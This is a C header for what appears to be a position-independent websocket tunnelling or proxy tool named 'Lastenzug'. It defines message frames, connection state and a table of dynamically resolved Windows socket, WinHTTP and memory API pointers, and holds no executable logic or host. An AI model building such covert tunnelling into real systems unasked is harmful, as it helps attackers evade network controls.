#pragma once

#include "stdint.h"
#include "winhttp.h"

#include "ApiResolve.h"

// --- Generisches Zeugs ----

#define FAIL 0
#define SUCCESS 1

#define MAX_CONNECTIONS 250

// --- Lastenzug Definitionen ---

#define MAX_MESSAGE 100000

#define CMD_SEND 1
#define CMD_STOP 2

typedef struct {
	uint64_t session;
	uint64_t command;
	uint64_t message_len;
	uint8_t message[MAX_MESSAGE];
} LastenFrame;


// --- Andere Strukturen ---

typedef struct {

	CLOSEHANDLE _CloseHandle;
	CLOSESOCKET _Closesocket;
	CONNECT _Connect;
	COPYMEMORY _CopyMemory;
	CREATETHREAD _CreateThread;
	DNSQUERY_A _DnsQuery_A;
	LSTRLENA _lstrlenA;
	LSTRLENW _lstrlenW;
	IOCTLSOCKET _ioctlsocket;
	SEND _send;
  	SELECT _select;
	RECV _recv;
	_SOCKET _socket;
	VIRTUALALLOC _VirtualAlloc;
	VIRTUALFREE _VirtualFree;
	WAITFORSINGLEOBJECT _WaitForSingleObject;
	WINHTTPCLOSEHANDLE _WinHttpCloseHandle;
	WINHTTPCONNECT _WinHttpConnect;
	WINHTTPOPEN _WinHttpOpen;
	WINHTTPOPENREQUEST _WinHttpOpenRequest;
	WINHTTPRECEIVERESPONSE _WinHttpReceiveResponse;
	WINHTTPSENDREQUEST _WinHttpSendRequest;
	WINHTTPSETOPTION _WinHttpSetOption;
	WINHTTPWEBSOCKETCLOSE _WinHttpWebSocketClose;
	WINHTTPWEBSOCKETCOMPLETEUPGRADE _WinHttpWebSocketCompleteUpgrade;
	WINHTTPWEBSOCKETRECEIVE _WinHttpWebSocketReceive;
	WINHTTPWEBSOCKETSEND _WinHttpWebSocketSend;
	WINHTTPWEBSOCKETSHUTDOWN _WinHttpWebSocketShutdown;
  WSAFDISSET _wsafdisset;
	
} fPointers;

typedef struct {

	HINTERNET hWebSocket;
	FD_SET master_set;
	BOOL bContinue;
	fPointers fPointers;
	wchar_t* wServerName;
	wchar_t* wPath;
	INTERNET_PORT port;

	uint32_t numConnections;
	uint64_t ids[MAX_CONNECTIONS];
	SOCKET sockets[MAX_CONNECTIONS];

}LastenPIC;


typedef DWORD(GO)(wchar_t* w_proxy, wchar_t* w_path, DWORD port, char* ptr_username, char* ptr_proxy);
